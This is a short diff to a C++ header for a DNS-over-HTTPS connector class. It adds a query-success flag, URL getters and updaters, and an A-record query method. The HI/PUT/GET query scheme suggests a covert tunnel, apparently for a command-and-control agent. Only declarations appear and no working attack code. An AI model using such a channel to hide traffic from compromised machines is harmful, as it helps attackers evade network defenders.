@@ -69,6 +69,10 @@ private:
     ULONG lastDownTotal   = 0;
     ULONG lastUpTotal     = 0;
 
+    // Indicates whether the last DoH query (HI/PUT/GET) completed successfully
+    // from the connector's perspective (HTTP request + DNS parse both OK).
+    BOOL  lastQueryOk     = FALSE;
+
 public:
     ConnectorDoH();
     // IMPORTANT:
@@ -97,7 +101,13 @@ public:
     void  ResetTrafficTotals() { lastUpTotal = 0; lastDownTotal = 0; }
     BOOL  IsBusy() const { return (downBuf != NULL); }
 
+    BOOL  WasLastQueryOk() const { return lastQueryOk; }
+
+    const BYTE* GetUrls() const { return profile.urls; }
+    void        UpdateUrls(BYTE* urls);
+
 private:
     BOOL  DohQueryTxt(const CHAR* qname, BYTE* outBuf, ULONG outBufSize, ULONG* outSize);
-    BOOL  PerformHttpRequest(const CHAR* requestUrl, BYTE** outData, ULONG* outLen);
+    BOOL  DohQueryA(const CHAR* qname, BYTE* outBuf, ULONG outBufSize, ULONG* outSize);
+    BOOL  PerformHttpRequest(const CHAR* qname, USHORT qtype, BYTE** outData, ULONG* outLen);
 };
